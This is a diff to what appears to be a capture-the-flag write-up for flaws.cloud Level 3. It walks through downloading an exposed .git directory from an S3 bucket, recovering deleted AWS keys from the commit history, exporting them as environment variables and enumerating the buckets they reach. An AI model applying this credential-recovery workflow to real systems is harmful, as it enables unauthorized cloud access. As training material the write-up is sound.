@@ -4,7 +4,7 @@ http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/
 
 <img width="847" height="762" alt="image" src="https://github.com/user-attachments/assets/8d6b5d74-c12f-49c8-9968-23db3ad248db" />
 
-We tried listing the bucket: 
+Using the compromised AWS credentials obtained previously, we enumerate the contents of the Level 3 S3 bucket. In addition to several HTML files, we discover a `.git/` directory, indicating that the application's Git repository has been accidentally exposed.
 
 ```
 aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud                
@@ -18,11 +18,13 @@ aws s3 ls s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud
 2017-02-26 19:14:33         26 robots.txt
 ```
 
-Seeing there a `.git/` repository, we can add a `cp --recursive` to our bucket and download the files into our directory to investigate.
+Since the Git repository is publicly accessible, we recursively download the bucket contents to our local machine for further analysis.
 ```
 aws s3 cp --recursive s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud .
 ```
 <img width="1493" height="623" alt="image" src="https://github.com/user-attachments/assets/e1e4f8cd-7bc2-4f92-9d51-66304d8752fe" />
+
+After downloading the repository, we inspect the Git commit history. Two commits are present, one of which is suspiciously titled "Oops, accidentally added something I shouldn't have", suggesting that sensitive information may have been committed and later removed.
 
 ```
 git log                                                     
@@ -38,6 +40,9 @@ Date:   Sun Sep 17 09:10:07 2017 -0600
 
     first commit
 ```
+
+To inspect the changes made in each commit, we use `git log -p`, which displays the commit diffs. The output reveals a file named `access_keys.txt` containing AWS credentials that were committed to the repository and later removed. Although the file no longer exists in the latest revision, Git preserves the complete history unless it is explicitly rewritten.
+
 ```
 git log -p
 <SNIP>
@@ -54,6 +59,7 @@ new file mode 100644
 index 0000000..76e4934
 <SNIP>
 ```
+The exposed AWS access key and secret key are exported as environment variables so that the AWS CLI authenticates as the compromised IAM user.
 
 ```
 export AWS_ACCESS_KEY_ID=AXXXXXXXXXXXXXXXXXXX7SA                                                                                  
@@ -64,6 +70,8 @@ export AWS_SECRET_ACCESS_KEY='OdNaXXXXXXXXXXXXXXXXXXXXXX3Jys'
 ```                                                                                                                                                                                                                                           
 export AWS_DEFAULT_REGION='us-west-2'
 ```
+We verify the credentials using AWS Security Token Service (STS). The response confirms that the leaked keys belong to an IAM user named `backup` within the target AWS account.
+
 ```                                                                                                                                                                                                                                         
 aws sts get-caller-identity
 {
@@ -72,6 +80,9 @@ aws sts get-caller-identity
     "Arn": "arn:aws:iam::97XXXXXXX29:user/backup"
 }
 ```
+
+With valid credentials, we enumerate all S3 buckets accessible to the compromised IAM user. The output reveals multiple buckets corresponding to later challenge levels, demonstrating how leaked credentials can provide attackers with broad visibility across an AWS environment.
+
 ```                                                                                                                                                                                                                                           
  aws s3 ls                                                         
 2026-04-28 07:44:51 2f4e53154c0a7fd086a04a12a452c2a4caed8da0.flaws.cloud
